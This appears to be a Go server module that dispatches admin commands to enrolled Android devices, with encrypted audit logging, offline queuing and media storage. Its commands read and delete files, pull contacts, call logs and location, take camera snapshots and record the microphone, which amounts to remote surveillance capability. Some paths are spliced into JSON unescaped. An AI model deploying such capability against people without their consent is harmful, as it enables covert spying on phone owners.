package dispatcher

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"log"
	"strings"
	"sync"
	"time"
	"unicode/utf8"

	"github.com/enterprise/android-remote-access/server/internal/database"
	"github.com/enterprise/android-remote-access/server/internal/models"
	"github.com/enterprise/android-remote-access/server/internal/security"
	ws "github.com/enterprise/android-remote-access/server/internal/websocket"
	"github.com/google/uuid"
)

// CommandDispatcher orchestrates command execution
type CommandDispatcher struct {
	hub          *ws.Hub
	db           *database.PostgresDB
	cache        *database.RedisCache
	encryptor    *security.DataEncryptor
	commandQueue chan *CommandTask
	ctx          context.Context
	cancel       context.CancelFunc
	results        sync.Map // transaction ID -> *CommandResult
}

// CommandTask represents a command to be executed
type CommandTask struct {
	Command       *models.DeviceCommand
	Admin         *models.Administrator
	IPAddress     string
	UserAgent     string
	ResultHandler chan *CommandResult
}

// CommandResult represents the result of a command execution
type CommandResult struct {
	TransactionID uuid.UUID `json:"transaction_id"`
	Status        string    `json:"status"`
	Data          []byte    `json:"-"`
	DataJSON      string    `json:"data,omitempty"`
	Error         string    `json:"error,omitempty"`
}

func (r *CommandResult) ForJSON() map[string]interface{} {
	out := map[string]interface{}{
		"transaction_id": r.TransactionID.String(),
		"status":         r.Status,
	}
	if len(r.Data) > 0 {
		out["data"] = EncodeCommandData(r.Data)
	}
	if r.Error != "" {
		out["error"] = r.Error
	}
	return out
}

// EncodeCommandData prepares agent payload bytes for JSON API responses.
// Text/JSON stay readable; binary media (JPEG/PNG/audio/etc.) is base64-encoded
// so the control panel can decode and display clear images.
func EncodeCommandData(data []byte) interface{} {
	if len(data) == 0 {
		return nil
	}
	if isBinaryPayload(data) || !utf8.Valid(data) {
		return base64.StdEncoding.EncodeToString(data)
	}
	trimmed := bytes.TrimSpace(data)
	if len(trimmed) > 0 && (trimmed[0] == '{' || trimmed[0] == '[') {
		var parsed interface{}
		if err := json.Unmarshal(trimmed, &parsed); err == nil {
			return parsed
		}
	}
	return string(data)
}

func isBinaryPayload(data []byte) bool {
	if len(data) < 3 {
		return false
	}
	switch {
	case data[0] == 0xFF && data[1] == 0xD8: // JPEG
		return true
	case data[0] == 0x89 && data[1] == 0x50 && data[2] == 0x4E: // PNG
		return true
	case data[0] == 'G' && data[1] == 'I' && data[2] == 'F': // GIF
		return true
	case len(data) >= 12 && string(data[0:4]) == "RIFF" && string(data[8:12]) == "WEBP":
		return true
	case string(data[0:4]) == "OggS":
		return true
	case len(data) >= 8 && string(data[4:8]) == "ftyp": // MP4 / M4A
		return true
	default:
		return false
	}
}

func (d *CommandDispatcher) storeResult(result *CommandResult) {
	if result == nil {
		return
	}
	d.results.Store(result.TransactionID, result)
}

// NewCommandDispatcher creates a new command dispatcher
func NewCommandDispatcher(hub *ws.Hub, db *database.PostgresDB, cache *database.RedisCache, encryptor *security.DataEncryptor) *CommandDispatcher {
	ctx, cancel := context.WithCancel(context.Background())
	d := &CommandDispatcher{
		hub:          hub,
		db:           db,
		cache:        cache,
		encryptor:    encryptor,
		commandQueue: make(chan *CommandTask, 1000),
		ctx:          ctx,
		cancel:       cancel,
	}

	// Start worker pool
	for i := 0; i < 10; i++ {
		go d.worker(i)
	}

	// Start pending command processor
	go d.processPendingCommands()

	return d
}

// worker processes command tasks
func (d *CommandDispatcher) worker(id int) {
	for {
		select {
		case task := <-d.commandQueue:
			d.executeCommand(task)
		case <-d.ctx.Done():
			return
		}
	}
}

// ExecuteCommand queues a command for execution
func (d *CommandDispatcher) ExecuteCommand(task *CommandTask) <-chan *CommandResult {
	resultChan := make(chan *CommandResult, 1)
	task.ResultHandler = resultChan
	d.commandQueue <- task
	return resultChan
}

// executeCommand performs the actual command execution
func (d *CommandDispatcher) executeCommand(task *CommandTask) {
	result := &CommandResult{
		TransactionID: task.Command.TransactionID,
	}

	// Create audit log entry (payload encrypted at rest)
	cmdPayload := task.Command.Payload
	if sealed, err := security.MustEncrypt(d.encryptor, []byte(task.Command.Payload), []byte(security.AADAuditPayloadRecord(task.Command.TransactionID))); err != nil {
		log.Printf("Refusing command without audit encryption: %v", err)
		result.Status = "failed"
		result.Error = "encryption required"
		select {
		case task.ResultHandler <- result:
		case <-time.After(5 * time.Second):
		}
		d.storeResult(result)
		return
	} else {
		cmdPayload = base64.StdEncoding.EncodeToString(sealed)
	}

	auditLog := &models.AuditLog{
		ID:                uuid.New(),
		TransactionID:     task.Command.TransactionID,
		AdministratorID:   task.Admin.ID,
		AdministratorName: task.Admin.Username,
		DeviceID:          task.Command.TargetDeviceID,
		CommandType:       string(task.Command.CommandType),
		CommandPayload:    cmdPayload,
		ResponseStatus:    string(models.StatusPending),
		IPAddress:         task.IPAddress,
		UserAgent:         task.UserAgent,
		Timestamp:         time.Now(),
	}

	// Get device name for audit
	if device, err := d.db.GetDeviceByID(context.Background(), task.Command.TargetDeviceID); err == nil {
		auditLog.DeviceName = device.FriendlyName
	}

	// Store audit log
	if err := d.db.CreateAuditLog(context.Background(), auditLog); err != nil {
		log.Printf("Failed to create audit log: %v", err)
	}

	// Require an established device session (not merely a socket)
	sessionReady := d.hub.IsDeviceSessionReady(task.Command.TargetDeviceID)

	if !sessionReady {
		// Queue command for offline / pre-session device
		result.Status = "queued"
		result.Data = []byte(fmt.Sprintf(`{"message": "Device offline or session not ready, command queued", "device_id": "%s"}`, task.Command.TargetDeviceID))

		pendingCmd := &models.PendingCommand{
				ID:          uuid.New(),
				DeviceID:    task.Command.TargetDeviceID,
				CommandType: string(task.Command.CommandType),
				Payload:     "",
				Priority:    task.Command.Priority,
				Status:      "queued",
				CreatedAt:   time.Now(),
				ExpiresAt:   time.Now().Add(24 * time.Hour),
			}
		if sealed, err := security.MustEncrypt(d.encryptor, []byte(task.Command.Payload), []byte(security.AADPendingRecord(pendingCmd.ID))); err != nil {
			log.Printf("Refusing to queue plaintext pending command: %v", err)
			result.Status = "failed"
			result.Error = "encryption required"
		} else {
			pendingCmd.Payload = base64.StdEncoding.EncodeToString(sealed)
			if err := d.db.CreatePendingCommand(context.Background(), pendingCmd); err != nil {
				log.Printf("Failed to queue pending command: %v", err)
			}
		}

		auditPayload, _ := security.MustEncrypt(d.encryptor, result.Data, []byte(security.AADAuditResponseRecord(task.Command.TransactionID)))
		d.db.UpdateAuditLogResponse(context.Background(), task.Command.TransactionID, result.Status, auditPayload)

		select {
		case task.ResultHandler <- result:
		case <-time.After(5 * time.Second):
		}
		d.storeResult(result)
		return
	}

	// Send command to device
	response, err := d.hub.SendCommandToDevice(task.Command.TargetDeviceID, task.Command)

	if err != nil {
		result.Status = "failed"
		result.Error = err.Error()
		auditPayload, _ := security.MustEncrypt(d.encryptor, []byte(err.Error()), []byte(security.AADAuditResponseRecord(task.Command.TransactionID)))
		d.db.UpdateAuditLogResponse(context.Background(), task.Command.TransactionID, "failed", auditPayload)
	} else {
		result.Status = string(response.Status)
		result.Data = response.Data
		if response.ErrorMessage != "" {
			result.Error = response.ErrorMessage
		}

		auditPlain := response.Data
		if len(auditPlain) == 0 && response.ErrorMessage != "" {
			auditPlain = []byte(response.ErrorMessage)
		}
		auditPayload, encErr := security.MustEncrypt(d.encryptor, auditPlain, []byte(security.AADAuditResponseRecord(task.Command.TransactionID)))
		if encErr != nil {
			log.Printf("Failed to encrypt audit response: %v", encErr)
			auditPayload = nil
		}
		d.db.UpdateAuditLogResponse(context.Background(), task.Command.TransactionID, string(response.Status), auditPayload)

		if d.shouldStoreMedia(task.Command.CommandType) {
			d.storeMediaFile(response, task.Command.TargetDeviceID, auditLog.ID)
		}
	}

	select {
	case task.ResultHandler <- result:
	case <-time.After(5 * time.Second):
	}
	d.storeResult(result)
}

// shouldStoreMedia determines if command result should be stored as media
func (d *CommandDispatcher) shouldStoreMedia(cmdType models.CommandType) bool {
	mediaCommands := map[models.CommandType]bool{
		models.CmdCameraSnapshot: true,
		models.CmdMicStart:       true,
		models.CmdMicStop:        true,
		models.CmdMicStream:      true,
	}
	return mediaCommands[cmdType]
}

// storeMediaFile encrypts and stores media data
func (d *CommandDispatcher) storeMediaFile(response *models.AgentResponse, deviceID uuid.UUID, auditLogID uuid.UUID) {
	if len(response.Data) == 0 {
		return
	}

	payload := response.Data
	source := string(response.CommandType)
	mimeType := ""
	var fileType, fileName string

	switch response.CommandType {
	case models.CmdCameraSnapshot:
		fileType = "image"
		mimeType = "image/jpeg"
		fileName = fmt.Sprintf("camera_%s_%d.jpg", deviceID.String()[:8], time.Now().Unix())
	case models.CmdMicStop:
		fileType = "audio"
		mimeType = "audio/mp4"
		fileName = fmt.Sprintf("audio_%s_%d.m4a", deviceID.String()[:8], time.Now().Unix())
		if extracted := extractAudioBytes(payload); extracted != nil {
			payload = extracted
		} else {
			return
		}
	case models.CmdMicStart, models.CmdMicStream:
		fileType = "audio"
		mimeType = "audio/mp4"
		fileName = fmt.Sprintf("audio_%s_%d.m4a", deviceID.String()[:8], time.Now().Unix())
		// Skip JSON-only acknowledgements like {"recording":true}
		if looksLikeJSONObject(payload) {
			if extracted := extractAudioBytes(payload); extracted != nil {
				payload = extracted
			} else {
				return
			}
		}
	default:
		return
	}

	if len(payload) == 0 {
		return
	}

	mediaFile := &models.MediaFile{
		ID:            uuid.New(),
		AuditLogID:    auditLogID,
		DeviceID:      deviceID,
		FileName:      fileName,
		FileType:      fileType,
		FileSize:      int64(len(payload)),
		EncryptedData: nil,
		Checksum:      security.GenerateChecksum(payload),
		Source:        source,
		MimeType:      mimeType,
		DataEntryDate: time.Now().UTC(),
		CreatedAt:     time.Now().UTC(),
	}
	stored, err := security.MustEncrypt(d.encryptor, payload, []byte(security.AADMediaRecord(mediaFile.ID)))
	if err != nil {
		log.Printf("Refusing to store plaintext media: %v", err)
		return
	}
	mediaFile.EncryptedData = stored

	if err := d.db.CreateMediaFile(context.Background(), mediaFile); err != nil {
		log.Printf("Failed to store media file: %v", err)
	}
}

func looksLikeJSONObject(data []byte) bool {
	trimmed := bytes.TrimSpace(data)
	return len(trimmed) > 0 && trimmed[0] == '{'
}

func extractAudioBytes(data []byte) []byte {
	var obj map[string]interface{}
	if err := json.Unmarshal(data, &obj); err != nil {
		return nil
	}
	for _, key := range []string{"audio_base64", "audio", "base64", "data"} {
		v, ok := obj[key]
		if !ok {
			continue
		}
		s, ok := v.(string)
		if !ok || s == "" {
			continue
		}
		if strings.HasPrefix(s, "data:") {
			if i := strings.Index(s, ","); i >= 0 {
				s = s[i+1:]
			}
		}
		raw, err := base64.StdEncoding.DecodeString(s)
		if err != nil {
			continue
		}
		if len(raw) > 0 {
			return raw
		}
	}
	return nil
}

// processPendingCommands handles queued commands when devices come online
func (d *CommandDispatcher) processPendingCommands() {
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ticker.C:
			// Check for devices that came online
			onlineDevices := d.hub.GetOnlineDeviceIDs()

			for _, deviceID := range onlineDevices {
				d.processDeviceQueue(deviceID)
			}

		case <-d.ctx.Done():
			return
		}
	}
}

// processDeviceQueue processes pending commands for a specific device
func (d *CommandDispatcher) processDeviceQueue(deviceID uuid.UUID) {
	pendingCommands, err := d.db.GetPendingCommandsForDevice(context.Background(), deviceID)
	if err != nil {
		return
	}

	for _, pending := range pendingCommands {
		payload := pending.Payload
		if d.encryptor != nil {
			if raw, err := base64.StdEncoding.DecodeString(pending.Payload); err == nil {
				plain, derr := d.encryptor.DecryptWithAAD(raw, []byte(security.AADPendingRecord(pending.ID)))
				if derr != nil {
					log.Printf("pending command %s decrypt failed: %v", pending.ID, derr)
					continue
				}
				payload = string(plain)
			} else {
				log.Printf("pending command %s: invalid ciphertext encoding", pending.ID)
				continue
			}
		}

		cmd := &models.DeviceCommand{
			TransactionID:  pending.ID,
			CommandType:    models.CommandType(pending.CommandType),
			TargetDeviceID: deviceID,
			Payload:        payload,
			TimeoutSeconds: 60,
			IssuedAt:       pending.CreatedAt,
		}

		if !d.hub.IsDeviceSessionReady(deviceID) {
			continue
		}

		response, err := d.hub.SendCommandToDevice(deviceID, cmd)
		if err != nil {
			log.Printf("Failed to dispatch queued command %s: %v", pending.ID, err)
			d.db.UpdatePendingCommandStatus(context.Background(), pending.ID, "failed")
			continue
		}

		if response.Status == models.StatusSuccess {
			d.db.UpdatePendingCommandStatus(context.Background(), pending.ID, "completed")
			if d.shouldStoreMedia(cmd.CommandType) {
				d.storeMediaFile(response, deviceID, uuid.Nil)
			}
		} else {
			d.db.UpdatePendingCommandStatus(context.Background(), pending.ID, "dispatched")
		}
	}
}

// GetCommandStatus retrieves the current status of a command
func (d *CommandDispatcher) GetCommandStatus(transactionID uuid.UUID) (*CommandResult, error) {
	if v, ok := d.results.Load(transactionID); ok {
		if result, ok := v.(*CommandResult); ok {
			return result, nil
		}
	}

	if d.cache != nil {
		response, err := d.cache.GetCommandResponse(context.Background(), transactionID)
		if err == nil && response != nil {
			return &CommandResult{
				TransactionID: response.TransactionID,
				Status:        string(response.Status),
				Data:          response.Data,
				Error:         response.ErrorMessage,
			}, nil
		}
	}

	if d.db != nil {
		logEntry, err := d.db.GetAuditLogByTransactionID(context.Background(), transactionID)
		if err == nil && logEntry != nil {
			status := logEntry.ResponseStatus
			if status == "" {
				status = "pending"
			}
			data := logEntry.ResponseData
			if d.encryptor != nil && len(data) > 0 {
				plain, derr := d.encryptor.DecryptWithAAD(data, []byte(security.AADAuditResponseRecord(transactionID)))
				if derr != nil {
					return nil, fmt.Errorf("audit response decrypt: %w", derr)
				}
				data = plain
			}
			return &CommandResult{
				TransactionID: transactionID,
				Status:        status,
				Data:          data,
			}, nil
		}
	}

	return nil, fmt.Errorf("command status not found")
}

// BroadcastCommand sends a command to multiple devices
func (d *CommandDispatcher) BroadcastCommand(cmdType models.CommandType, payload string, deviceIDs []uuid.UUID, admin *models.Administrator) []uuid.UUID {
	var queued []uuid.UUID

	for _, deviceID := range deviceIDs {
		cmd := &models.DeviceCommand{
			TransactionID:  uuid.New(),
			CommandType:     cmdType,
			TargetDeviceID:  deviceID,
			Payload:         payload,
			TimeoutSeconds:  60,
			IssuedBy:        admin.ID,
			IssuedAt:        time.Now(),
		}

		task := &CommandTask{
			Command: cmd,
			Admin:   admin,
		}

		result := <-d.ExecuteCommand(task)
		if result.Status == "queued" {
			queued = append(queued, deviceID)
		}
	}

	return queued
}

// CommandBuilder provides fluent interface for building commands
type CommandBuilder struct {
	dispatcher *CommandDispatcher
	admin      *models.Administrator
	ipAddress  string
	userAgent  string
	Command    *models.DeviceCommand
}

// NewCommandBuilder creates a new command builder
func NewCommandBuilder(d *CommandDispatcher) *CommandBuilder {
	return &CommandBuilder{
		dispatcher: d,
	}
}

// WithAdmin sets the admin executing the command
func (b *CommandBuilder) WithAdmin(admin *models.Administrator) *CommandBuilder {
	b.admin = admin
	return b
}

// WithContext sets request context info
func (b *CommandBuilder) WithContext(ipAddress, userAgent string) *CommandBuilder {
	b.ipAddress = ipAddress
	b.userAgent = userAgent
	return b
}

// FileList requests file listing from a device
func (b *CommandBuilder) FileList(deviceID uuid.UUID, path string) <-chan *CommandResult {
	return b.execute(models.CmdFileList, deviceID, fmt.Sprintf(`{"path": "%s"}`, path), 30)
}

// FileRead reads a file from a device
func (b *CommandBuilder) FileRead(deviceID uuid.UUID, path string) <-chan *CommandResult {
	return b.execute(models.CmdFileRead, deviceID, fmt.Sprintf(`{"path": "%s"}`, path), 60)
}

// FileReadChunk reads a byte range from a device file (payload is JSON).
func (b *CommandBuilder) FileReadChunk(deviceID uuid.UUID, payloadJSON string) <-chan *CommandResult {
	return b.execute(models.CmdFileReadChunk, deviceID, payloadJSON, 120)
}

// FileDelete deletes a file from a device
func (b *CommandBuilder) FileDelete(deviceID uuid.UUID, path string) <-chan *CommandResult {
	return b.execute(models.CmdFileDelete, deviceID, fmt.Sprintf(`{"path": "%s"}`, path), 30)
}

// GetContacts retrieves contacts from a device
func (b *CommandBuilder) GetContacts(deviceID uuid.UUID) <-chan *CommandResult {
	return b.execute(models.CmdGetContacts, deviceID, "{}", 60)
}

// GetCallLogs retrieves call logs from a device
func (b *CommandBuilder) GetCallLogs(deviceID uuid.UUID) <-chan *CommandResult {
	return b.execute(models.CmdGetCallLogs, deviceID, "{}", 60)
}

// GetDeviceInfo retrieves device info
func (b *CommandBuilder) GetDeviceInfo(deviceID uuid.UUID) <-chan *CommandResult {
	return b.execute(models.CmdGetDeviceInfo, deviceID, "{}", 30)
}

// GetLocation retrieves device location
func (b *CommandBuilder) GetLocation(deviceID uuid.UUID) <-chan *CommandResult {
	return b.execute(models.CmdGetLocation, deviceID, "{}", 30)
}

// CameraSnapshot captures a photo from device camera
func (b *CommandBuilder) CameraSnapshot(deviceID uuid.UUID, camera string) <-chan *CommandResult {
	return b.execute(models.CmdCameraSnapshot, deviceID, fmt.Sprintf(`{"camera": "%s"}`, camera), 90)
}

// MicStart starts audio recording on device
func (b *CommandBuilder) MicStart(deviceID uuid.UUID, duration int) <-chan *CommandResult {
	return b.execute(models.CmdMicStart, deviceID, fmt.Sprintf(`{"duration": %d}`, duration), duration+10)
}

// GetForegroundApp gets current foreground app
func (b *CommandBuilder) GetForegroundApp(deviceID uuid.UUID) <-chan *CommandResult {
	return b.execute(models.CmdGetForegroundApp, deviceID, "{}", 15)
}

// execute runs a command
func (b *CommandBuilder) execute(cmdType models.CommandType, deviceID uuid.UUID, payload string, timeout int) <-chan *CommandResult {
	cmd := &models.DeviceCommand{
		TransactionID:  uuid.New(),
		CommandType:    cmdType,
		TargetDeviceID:  deviceID,
		Payload:        payload,
		TimeoutSeconds: timeout,
		IssuedBy:       b.admin.ID,
		IssuedAt:       time.Now(),
	}

	b.Command = cmd

	task := &CommandTask{
		Command:   cmd,
		Admin:     b.admin,
		IPAddress: b.ipAddress,
		UserAgent: b.userAgent,
	}

	return b.dispatcher.ExecuteCommand(task)
}
